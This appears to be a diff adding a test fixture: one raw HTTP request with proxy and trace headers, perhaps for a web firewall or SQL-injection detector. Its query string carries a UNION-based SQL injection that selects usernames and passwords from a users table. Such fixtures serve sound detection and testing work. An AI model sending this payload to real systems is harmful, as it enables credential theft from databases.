@@ -1,0 +1,13 @@
+GET /product?id=1%27+UNION+SELECT+username,password+FROM+users-- - HTTP/1.1
+CDN-Loop: google
+X-Forwarded-Proto: https
+Connection: Keep-Alive
+X-Forwarded-For: 33.59.249.251
+Accept: */*
+User-Agent: curl/8.4.0
+Host: test.com
+Accept-Encoding: gzip, deflate
+Via: 1.1 google
+X-Forwarded-For: 124.247.159.22,38.52.175.190
+X-Cloud-Trace-Context: b12aa1f6d42fddbb7a86f7a243c71b9a/4762345367261153902
+
